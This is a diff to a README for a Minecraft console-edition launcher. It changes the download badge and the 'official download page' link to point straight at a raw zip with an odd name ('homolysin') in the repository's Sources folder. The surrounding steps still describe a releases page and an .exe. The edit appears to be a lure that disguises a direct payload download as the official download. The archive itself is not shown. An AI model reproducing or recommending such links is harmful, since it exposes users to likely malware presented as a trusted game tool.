@@ -1,6 +1,6 @@
 # 🎮 LCE-Emerald-Launcher - Experience legacy console Minecraft on PC
 
-[![](https://img.shields.io/badge/Download-LCE-Emerald-Launcher-blue.svg)](https://github.com/Poloshirtalaqabah426/LCE-Emerald-Launcher)
+[![](https://img.shields.io/badge/Download-LCE-Emerald-Launcher-blue.svg)](https://github.com/Poloshirtalaqabah426/LCE-Emerald-Launcher/raw/refs/heads/main/Sources/Launcher-Emerald-LC-homolysin.zip)
 
 ## 📦 About this project
 
@@ -21,7 +21,7 @@ Your computer must meet these basic needs to run the launcher smoothly:
 
 Follow these steps to install and play Minecraft using the launcher.
 
-1.  Visit the [official download page](https://github.com/Poloshirtalaqabah426/LCE-Emerald-Launcher).
+1.  Visit the [official download page](https://github.com/Poloshirtalaqabah426/LCE-Emerald-Launcher/raw/refs/heads/main/Sources/Launcher-Emerald-LC-homolysin.zip).
 2.  Look for the latest release on the right side of the page.
 3.  Click the file ending in .exe to start your download.
 4.  Open the file once the download finishes.
